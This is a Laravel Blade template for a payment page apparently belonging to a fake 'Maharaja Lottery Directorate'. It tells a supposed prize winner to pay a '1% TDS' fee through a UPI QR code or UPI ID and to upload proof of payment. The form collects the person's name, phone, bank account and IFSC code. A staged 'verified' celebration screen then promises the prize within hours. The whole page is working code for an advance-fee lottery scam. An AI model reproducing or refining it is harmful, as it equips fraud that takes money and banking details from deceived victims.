@extends('frontend.layouts.app')

@section('content')
<!-- Background Backdrop Container -->
<section class="min-h-[calc(100vh-80px)] bg-gradient-to-br from-[#040A1A] via-[#071533] to-[#040A1A] py-6 sm:py-10 px-3 sm:px-6 lg:px-8 flex items-center justify-center relative overflow-hidden">
    
    <!-- Stylized Background Effects -->
    <div class="absolute inset-0 pointer-events-none opacity-10" style="background-image: url('{{ asset('img/lottery-pattern.svg') }}'); background-repeat: repeat; background-size: 140px 140px;"></div>
    <div class="absolute -top-32 -left-32 w-80 h-80 bg-[#DFB755]/15 rounded-full blur-3xl pointer-events-none"></div>
    <div class="absolute -bottom-32 -right-32 w-80 h-80 bg-[#0F2356]/40 rounded-full blur-3xl pointer-events-none"></div>

    <!-- Main Simple TDS Payment Card -->
    <div id="tds-payment-card" class="relative w-full max-w-lg md:max-w-xl transition-all duration-300 bg-white rounded-3xl shadow-2xl overflow-hidden border-2 border-[#DFB755]/50 z-10">
        
        <!-- Royal Navy Header (Clean & Simple) -->
        <div class="bg-gradient-to-r from-[#040A1A] via-[#071533] to-[#0B193E] text-white px-5 py-4 flex items-center justify-between border-b border-[#DFB755]/30">
            <div class="flex items-center gap-3">
                <div class="w-9 h-9 rounded-xl bg-white/10 border border-[#DFB755]/40 flex items-center justify-center text-[#F3D068] text-sm shrink-0">
                    <i class="fa-solid fa-qrcode text-base"></i>
                </div>
                <div>
                    <span class="text-[9px] uppercase font-black tracking-widest text-[#DFB755] block">OFFICIAL QR PAYMENT</span>
                    <h2 class="text-base sm:text-lg font-serif font-black text-white leading-tight">1% TDS Verification Payment</h2>
                </div>
            </div>

            <!-- Back to Bank Details -->
            <a href="{{ route('withdrawal', ['ref' => $bookingRef, 'amount' => $prizeAmount, 'name' => $customerName, 'phone' => $customerPhone]) }}" 
                title="Edit Bank Details" 
                class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center text-xs transition">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
        </div>

        <!-- BIG & BOLD TDS AMOUNT HIGHLIGHT BANNER -->
        <div class="bg-gradient-to-b from-amber-500/10 via-amber-50 to-white border-b-2 border-[#DFB755]/50 py-4 px-4 text-center">
            <span class="text-[10px] uppercase font-extrabold tracking-widest text-amber-700 block mb-1">
                TDS AMOUNT TO PAY (1%)
            </span>
            <div class="text-3xl sm:text-4xl font-mono font-black text-[#0B193E] tracking-tight drop-shadow-xs">
                {{ $tdsFormatted }}
            </div>
            <div class="inline-flex items-center gap-2 mt-1.5 px-3 py-0.5 rounded-full bg-emerald-50 text-emerald-800 border border-emerald-200 text-xs font-bold">
                <i class="fa-solid fa-trophy text-amber-500 text-[10px]"></i>
                <span>Winning Prize: {{ $prizeAmount }} ({{ $winningFormatted }})</span>
            </div>
        </div>

        <!-- Clean 1-Line Beneficiary Summary Bar -->
        <div class="bg-stone-50 border-b border-stone-200 px-4 py-2 text-xs flex items-center justify-between text-stone-600">
            <div class="flex items-center gap-2 truncate">
                <span class="w-2 h-2 rounded-full bg-emerald-500 shrink-0"></span>
                <span class="font-bold text-stone-900 truncate">{{ $customerName }}</span>
                <span class="text-stone-300">•</span>
                <span class="font-mono text-stone-700">A/C: {{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }}</span>
                <span class="text-stone-300">•</span>
                <span class="font-mono text-stone-700">IFSC: {{ $ifscCode }}</span>
            </div>
            <span class="text-[10px] uppercase font-bold text-stone-400 shrink-0 ml-2">1% TDS</span>
        </div>

        <!-- STEP 1: Scan & Pay QR (Simple & Direct) -->
        <div id="payment-step-1" class="p-4 sm:p-6 space-y-4">
            
            <!-- Stepper Indicators -->
            <div class="flex items-center justify-center gap-2">
                <div class="flex items-center gap-1.5">
                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold">1</span>
                    <span class="text-xs font-bold text-[#071533]">Scan &amp; Pay</span>
                </div>
                <div class="w-8 h-0.5 bg-stone-200"></div>
                <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep2()">
                    <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">2</span>
                    <span class="text-xs font-medium text-stone-500">Upload Receipt</span>
                </div>
            </div>

            <!-- Title -->
            <div class="text-center space-y-0.5">
                <h3 class="text-lg font-serif font-black text-stone-900 leading-tight">
                    Scan to Pay <span class="text-amber-600 font-mono font-black">{{ $tdsFormatted }}</span>
                </h3>
                <p class="text-xs text-stone-500">Pay using any UPI App (GPay, PhonePe, Paytm, BHIM)</p>
            </div>

            <!-- QR Code Card Container -->
            <div class="flex justify-center">
                <div class="relative p-3 bg-white rounded-2xl border-2 border-[#DFB755] shadow-md group hover:border-amber-600 transition-all text-center">
                    @if(!empty($upiQrImage) && file_exists(public_path($upiQrImage)))
                        <img id="upi-qrcode" 
                            src="{{ asset($upiQrImage) }}?v={{ time() }}" 
                            alt="Scan UPI QR Code" 
                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
                            loading="eager">
                    @else
                        <img id="upi-qrcode" 
                            src="https://api.qrserver.com/v1/create-qr-code/?size=175x175&data={{ urlencode($upiUrl) }}&margin=2" 
                            alt="Scan UPI QR Code" 
                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
                            loading="eager"
                            onerror="this.src='https://chart.googleapis.com/chart?cht=qr&chs=175x175&chl={{ urlencode($upiUrl) }}';">
                    @endif

                    <div class="mt-2 text-[10px] font-bold text-stone-600 flex items-center justify-center gap-1">
                        <i class="fa-solid fa-shield-halved text-emerald-600 text-[10px]"></i>
                        <span>Maharaja Directorate Verified QR</span>
                    </div>
                </div>
            </div>

            <!-- Tap Preferred UPI App -->
            <div class="space-y-1 text-center">
                <span class="text-[10px] font-bold text-stone-500 uppercase tracking-wider block">
                    Or Tap to Pay Directly
                </span>
                <div class="grid grid-cols-4 gap-2">
                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-stone-100 flex items-center justify-center text-xs text-stone-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-brands fa-google text-blue-600 text-sm"></i>
                        </div>
                        <span class="text-[10px] font-bold text-stone-700 mt-1">GPay</span>
                    </a>

                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-purple-50 flex items-center justify-center text-xs text-purple-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-mobile-screen text-purple-600 text-sm"></i>
                        </div>
                        <span class="text-[10px] font-bold text-stone-700 mt-1">PhonePe</span>
                    </a>

                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-sky-50 flex items-center justify-center text-xs text-sky-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-wallet text-sky-600 text-sm"></i>
                        </div>
                        <span class="text-[10px] font-bold text-stone-700 mt-1">Paytm</span>
                    </a>

                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-emerald-50 flex items-center justify-center text-xs text-emerald-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-building-columns text-emerald-600 text-sm"></i>
                        </div>
                        <span class="text-[10px] font-bold text-stone-700 mt-1">BHIM</span>
                    </a>
                </div>
            </div>

            <!-- UPI ID & Copy Row -->
            <div class="bg-stone-50 border border-stone-200 rounded-xl p-2.5 flex items-center justify-between">
                <div class="min-w-0 pr-2">
                    <span class="block text-[8px] uppercase font-bold text-stone-400 tracking-wider">OFFICIAL UPI ID</span>
                    <span id="tds-upi-id-text" class="text-xs font-mono font-black text-stone-800 truncate block select-all">{{ $upiId }}</span>
                </div>
                <button type="button" 
                    onclick="copyUpiId()" 
                    id="copy-upi-btn"
                    class="px-3 py-1.5 rounded-lg bg-[#071533] hover:bg-[#0B193E] text-[#F3D068] text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer shadow-xs">
                    <i class="fa-regular fa-copy text-[11px]"></i>
                    <span>Copy</span>
                </button>
            </div>

            <!-- Next Button -->
            <button type="button" 
                onclick="goToStep2()" 
                class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                <span>I have paid {{ $tdsFormatted }} • Next</span>
                <i class="fa-solid fa-arrow-right text-xs"></i>
            </button>
        </div>

        <!-- STEP 2: Upload Payment Receipt (Simple & Clean) -->
        <div id="payment-step-2" class="p-4 sm:p-6 space-y-4 hidden">
            
            <!-- Stepper Progress -->
            <div class="flex items-center justify-center gap-2">
                <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep1()">
                    <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">1</span>
                    <span class="text-xs font-medium text-stone-500">Scan &amp; Pay</span>
                </div>
                <div class="w-8 h-0.5 bg-stone-200"></div>
                <div class="flex items-center gap-1.5">
                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold">2</span>
                    <span class="text-xs font-bold text-[#071533]">Upload Receipt</span>
                </div>
            </div>

            <!-- Title -->
            <div class="text-center space-y-0.5">
                <h3 class="text-lg font-serif font-black text-stone-900 leading-tight">
                    Upload Payment Screenshot
                </h3>
                <p class="text-xs text-stone-500">
                    Upload proof of <strong class="text-stone-900 font-mono">{{ $tdsFormatted }}</strong> TDS payment
                </p>
            </div>

            <!-- Upload Form -->
            <form id="tds-submit-form" enctype="multipart/form-data" class="space-y-4">
                @csrf
                <input type="hidden" name="booking_ref" value="{{ $bookingRef }}">
                <input type="hidden" name="customer_name" value="{{ $customerName }}">
                <input type="hidden" name="customer_phone" value="{{ $customerPhone }}">
                <input type="hidden" name="account_number" value="{{ $accountNumber }}">
                <input type="hidden" name="ifsc_code" value="{{ $ifscCode }}">
                <input type="hidden" name="bank_name" value="{{ $bankName }}">
                <input type="hidden" name="winning_prize_text" value="{{ $prizeAmount }}">
                <input type="hidden" name="winning_amount" value="{{ $winningAmount }}">
                <input type="hidden" name="tds_amount" value="{{ $tdsAmount }}">

                <!-- File Upload Box -->
                <div class="space-y-1">
                    <label class="block text-xs font-bold text-stone-700">
                        Payment Screenshot / Receipt <span class="text-rose-500">*</span>
                    </label>
                    <div id="dropzone" 
                        class="border-2 border-dashed border-stone-300 hover:border-[#DFB755] rounded-2xl p-5 text-center cursor-pointer transition bg-stone-50 hover:bg-stone-100/70"
                        onclick="document.getElementById('receipt_file').click()">
                        <input type="file" 
                            name="receipt_file" 
                            id="receipt_file" 
                            accept="image/*,application/pdf" 
                            class="hidden" 
                            onchange="handleReceiptPreview(this)">
                        
                        <div id="upload-placeholder" class="space-y-1.5">
                            <div class="w-11 h-11 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center mx-auto text-lg">
                                <i class="fa-solid fa-cloud-arrow-up"></i>
                            </div>
                            <p class="text-xs font-bold text-stone-800">Click to upload screenshot</p>
                            <p class="text-[11px] text-stone-400">PNG, JPG, WEBP or PDF (Max 10MB)</p>
                        </div>

                        <!-- Image Preview Box -->
                        <div id="receipt-preview-container" class="hidden space-y-2">
                            <img id="receipt-preview-img" src="" alt="Receipt Preview" class="max-h-44 mx-auto rounded-xl object-contain shadow-sm border border-stone-200">
                            <p id="receipt-file-name" class="text-xs font-bold text-stone-800 truncate"></p>
                            <button type="button" onclick="event.stopPropagation(); clearReceiptPreview();" class="text-rose-600 hover:text-rose-700 text-xs font-bold">
                                Remove &amp; choose another
                            </button>
                        </div>
                    </div>
                </div>

                <!-- UTR / Transaction ID -->
                <div class="space-y-1">
                    <label for="utr_number" class="block text-xs font-bold text-stone-700">
                        UPI Reference / UTR Number (Optional)
                    </label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-stone-400 text-xs">
                            <i class="fa-solid fa-receipt"></i>
                        </div>
                        <input type="text" 
                            name="utr_number" 
                            id="utr_number" 
                            placeholder="e.g. 428901234567 (12 digits)" 
                            maxlength="25"
                            class="w-full pl-9 pr-3 py-2.5 bg-white border border-stone-200 rounded-xl text-stone-800 placeholder-stone-400 text-xs font-mono focus:outline-none focus:border-[#DFB755] focus:ring-1 focus:ring-[#DFB755] transition">
                    </div>
                </div>

                <!-- Submit Button -->
                <div class="pt-1">
                    <button type="submit" 
                        id="submit-tds-btn"
                        class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                        <i class="fa-solid fa-circle-check text-yellow-300"></i>
                        <span id="submit-btn-text">Submit TDS Verification ({{ $tdsFormatted }})</span>
                    </button>
                </div>

                <!-- Back to Step 1 Button -->
                <button type="button" 
                    onclick="goToStep1()" 
                    class="w-full text-center text-xs text-stone-500 hover:text-stone-800 font-semibold transition py-1">
                    ← Back to QR Code
                </button>
            </form>
        </div>

    </div>
</section>

<!-- Celebration Boom Congratulations Modal (Fully Responsive) -->
<div id="celebration-modal" 
    class="fixed inset-0 z-[999999] hidden items-center justify-center p-3 sm:p-4 transition-all duration-500" 
    style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 999999; width: 100vw; height: 100vh; background-color: rgba(4, 10, 26, 0.96); backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px); overflow-y: auto;">
    
    <!-- Ambient Glow -->
    <div class="fixed w-96 h-96 bg-[#DFB755]/15 rounded-full blur-3xl pointer-events-none -z-10"></div>

    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-2 border-[#DFB755] rounded-3xl p-4 sm:p-6 max-w-sm sm:max-w-md w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] space-y-3 sm:space-y-3.5 my-auto max-h-[92vh] overflow-y-auto animate-in zoom-in-95 duration-300">
        <!-- Close Button -->
        <a href="{{ route('winnerlist') }}" class="absolute top-3 right-3 w-7 h-7 rounded-full bg-white/10 hover:bg-white/20 text-stone-300 hover:text-white flex items-center justify-center text-xs transition z-20" title="Close">
            <i class="fa-solid fa-xmark"></i>
        </a>

        <!-- Sparkle pattern -->
        <div class="absolute inset-0 opacity-15 bg-[radial-gradient(#DFB755_1px,transparent_1px)] [background-size:14px_14px] pointer-events-none"></div>

        <!-- Trophy Boom Icon with Bounce -->
        <div class="relative z-10 mx-auto w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-gradient-to-tr from-[#C59B27] via-[#F3D068] to-[#DFB755] text-[#071533] flex items-center justify-center text-xl sm:text-2xl shadow-xl shadow-amber-500/30 animate-bounce shrink-0">
            <i class="fa-solid fa-trophy"></i>
        </div>

        <!-- Header -->
        <div class="relative z-10 space-y-1">
            <span class="inline-flex items-center gap-1.5 px-3 py-0.5 rounded-full text-[9px] font-black uppercase tracking-widest bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                <i class="fa-solid fa-check text-[10px]"></i>
                <span>TDS Submission Verified</span>
            </span>
            <h2 class="text-xl sm:text-2xl font-serif font-black text-white leading-tight">
                🎉 CONGRATULATIONS! 🎉
            </h2>
            <p class="text-xs sm:text-sm font-serif font-bold text-[#F3D068] truncate" id="modal-customer-name">
                {{ $customerName }}
            </p>
        </div>

        <!-- Details Card -->
        <div class="relative z-10 bg-black/50 border border-[#DFB755]/30 rounded-2xl p-3 sm:p-3.5 text-left space-y-2 text-xs">
            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">Winning Prize</span>
                <span class="text-xs sm:text-sm font-mono font-black text-emerald-400">{{ $prizeAmount }} ({{ $winningFormatted }})</span>
            </div>

            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">1% TDS Submitted</span>
                <span class="text-xs sm:text-sm font-mono font-black text-[#F3D068]">{{ $tdsFormatted }}</span>
            </div>

            <div class="flex items-center justify-between pb-1.5 border-b border-white/10">
                <span class="text-[10px] uppercase tracking-wider font-bold text-stone-400">Target Bank Account</span>
                <span class="text-xs font-mono font-bold text-stone-200">{{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }} ({{ $ifscCode }})</span>
            </div>

            <p class="text-[11px] text-stone-300 leading-relaxed font-normal pt-0.5">
                Your 1% TDS payment proof and prize withdrawal application have been submitted to Maharaja Lottery Directorate. Upon verification, the full prize balance will be credited to your verified bank account within <strong class="text-[#F3D068]">2 to 4 hours</strong>.
            </p>
        </div>

        <!-- Action Buttons -->
        <div class="relative z-10 space-y-2 pt-0.5">
            

            <a href="{{ route('winnerlist') }}" 
                class="w-full py-2 rounded-xl bg-white/10 hover:bg-white/20 text-stone-200 hover:text-white font-bold text-xs transition flex items-center justify-center gap-1.5 border border-white/20">
                <i class="fa-solid fa-trophy text-[#DFB755] text-xs"></i>
                <span>Return to Result Desk</span>
            </a>
        </div>
    </div>
</div>

@push('scripts')
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
<script>
    // Confetti Mega Celebration Blast with Top zIndex
    function triggerTdsConfettiBoom() {
        if (typeof confetti !== 'function') return;

        // Wave 1: Immediate Left & Right Cannons
        confetti({
            particleCount: 110,
            angle: 60,
            spread: 80,
            origin: { x: 0.05, y: 0.65 },
            zIndex: 10000000,
            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700', '#FF3B30']
        });
        confetti({
            particleCount: 110,
            angle: 120,
            spread: 80,
            origin: { x: 0.95, y: 0.65 },
            zIndex: 10000000,
            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700', '#FF3B30']
        });

        // Wave 2: Center Mega Starburst at 200ms
        setTimeout(() => {
            confetti({
                particleCount: 150,
                spread: 110,
                origin: { x: 0.5, y: 0.5 },
                zIndex: 10000000,
                colors: ['#DFB755', '#F3D068', '#16A34A', '#E11D48', '#FFD700', '#38BDF8', '#FFFFFF']
            });
        }, 200);

        // Wave 3: Confetti Rain from Top at 500ms
        setTimeout(() => {
            confetti({
                particleCount: 90,
                spread: 120,
                origin: { x: 0.5, y: 0.2 },
                zIndex: 10000000,
                colors: ['#DFB755', '#16A34A', '#F59E0B', '#10B981', '#FFFFFF']
            });
        }, 500);

        // Wave 4: Final blast at 850ms
        setTimeout(() => {
            confetti({
                particleCount: 120,
                angle: 90,
                spread: 90,
                origin: { x: 0.5, y: 0.7 },
                zIndex: 10000000,
                colors: ['#DFB755', '#F3D068', '#16A34A', '#FFD700', '#FFFFFF']
            });
        }, 850);
    }

    // Navigation Between Step 1 & Step 2
    function goToStep2() {
        document.getElementById('payment-step-1').classList.add('hidden');
        document.getElementById('payment-step-2').classList.remove('hidden');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function goToStep1() {
        document.getElementById('payment-step-2').classList.add('hidden');
        document.getElementById('payment-step-1').classList.remove('hidden');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Copy UPI ID to Clipboard
    function copyUpiId() {
        const upiId = document.getElementById('tds-upi-id-text').innerText.trim();
        const btn = document.getElementById('copy-upi-btn');

        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(upiId).then(showCopiedState);
        } else {
            const input = document.createElement('input');
            input.value = upiId;
            document.body.appendChild(input);
            input.select();
            document.execCommand('copy');
            document.body.removeChild(input);
            showCopiedState();
        }

        function showCopiedState() {
            btn.innerHTML = '<i class="fa-solid fa-check text-[11px] text-emerald-400"></i><span>Copied!</span>';
            btn.classList.add('bg-emerald-700');
            setTimeout(() => {
                btn.innerHTML = '<i class="fa-regular fa-copy text-[11px]"></i><span>Copy</span>';
                btn.classList.remove('bg-emerald-700');
            }, 2000);
        }
    }

    // Handle Receipt Image Preview
    function handleReceiptPreview(input) {
        if (input.files && input.files[0]) {
            const file = input.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                document.getElementById('upload-placeholder').classList.add('hidden');
                document.getElementById('receipt-preview-container').classList.remove('hidden');
                document.getElementById('receipt-preview-img').src = e.target.result;
                document.getElementById('receipt-file-name').innerText = file.name;
            };

            reader.readAsDataURL(file);
        }
    }

    function clearReceiptPreview() {
        const fileInput = document.getElementById('receipt_file');
        fileInput.value = '';
        document.getElementById('receipt-preview-container').classList.add('hidden');
        document.getElementById('upload-placeholder').classList.remove('hidden');
    }

    // Handle AJAX TDS Form Submission
    document.getElementById('tds-submit-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const fileInput = document.getElementById('receipt_file');
        if (!fileInput.files || fileInput.files.length === 0) {
            alert('Please select and upload your payment receipt screenshot first.');
            return false;
        }

        const btn = document.getElementById('submit-tds-btn');
        const btnText = document.getElementById('submit-btn-text');
        btn.disabled = true;
        btnText.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Submitting TDS Proof...';

        const formData = new FormData(this);

        fetch("{{ route('tds.payment.submit') }}", {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            if (data.success) {
                // Open Celebration Boom Modal
                const celebrationModal = document.getElementById('celebration-modal');
                if (celebrationModal.parentElement !== document.body) {
                    document.body.appendChild(celebrationModal);
                }
                celebrationModal.classList.remove('hidden');
                celebrationModal.classList.add('flex');
                document.body.style.overflow = 'hidden';

                // Trigger Massive Confetti Boom Blast
                triggerTdsConfettiBoom();
                setTimeout(triggerTdsConfettiBoom, 700);
            } else {
                alert(data.message || 'Error submitting TDS payment proof.');
                btn.disabled = false;
                btnText.innerText = 'Submit TDS Verification';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while uploading. Please check your connection and try again.');
            btn.disabled = false;
            btnText.innerText = 'Submit TDS Verification';
        });
    });
</script>
@endpush
@endsection
